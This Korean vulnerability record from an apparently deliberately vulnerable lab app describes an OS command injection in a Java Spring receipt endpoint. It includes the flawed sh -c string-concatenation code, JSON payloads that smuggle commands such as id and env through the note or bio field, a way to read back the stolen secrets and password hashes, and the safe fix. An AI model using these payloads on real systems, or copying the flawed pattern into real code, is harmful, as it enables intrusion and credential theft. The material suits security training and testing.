# VULN-019 Java 영수증 생성 OS 커맨드 인젝션 (010의 java 짝)

- 대상 스택: java-spring
- 심각도: Critical
- 분류: A03:2021 Injection (OS Command Injection, CWE-78)

## 위치

`apps/java-spring/.../controller/OrderController.java`, `POST /api/orders/{id}/receipt` — VULN-010(node)의 java 짝. 기존에는 `Files.writeString` 으로 안전하게 파일을 썼으나, 이제 요청 바디의 `note`(없으면 `user.getBio()`, `PUT /api/profile` 로 설정 가능)를 셸 명령 문자열에 그대로 삽입해 `Runtime.getRuntime().exec(new String[]{"sh","-c",cmd})` 로 실행.

```java
String cmd = "echo \"영수증 - 주문번호: " + order.getTossOrderId()
        + " / 수령인: " + user.getName()
        + " / 메모: " + note + "\" > " + RECEIPTS_DIR.resolve(filename);
Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
```

## 트리거 방법

```
POST /api/java/orders/1/receipt
{"note": "x\"; id > receipts/receipt_1.txt; echo \""}
```

또는 `PUT /api/java/profile {"bio":"x\"; env > receipts/receipt_1.txt; echo \""}` 후 `POST /api/java/orders/1/receipt` (note 미전송 → bio 폴백).

이후 `GET /api/java/orders/receipt/receipt_1.txt` (VULN-011) 로 명령 출력 회수.

## 영향

- 컨테이너 내 임의 명령 실행. `env` → `TOSS_SECRET_KEY`, `cat data/app.mv.db` → 전체 `password_hash`.

## 증거 (재현 확인)

(진단 단계에서 채움) `note` 에 `; env >> receipts/receipt_1.txt; #` 삽입 후 영수증 다운로드 응답에 `TOSS_SECRET_KEY=...` 포함.

## 조치 상태: 미조치 (의도된 취약점)

정상 구현: `Files.writeString` 유지(셸 미경유), `note` 는 데이터로만 취급.
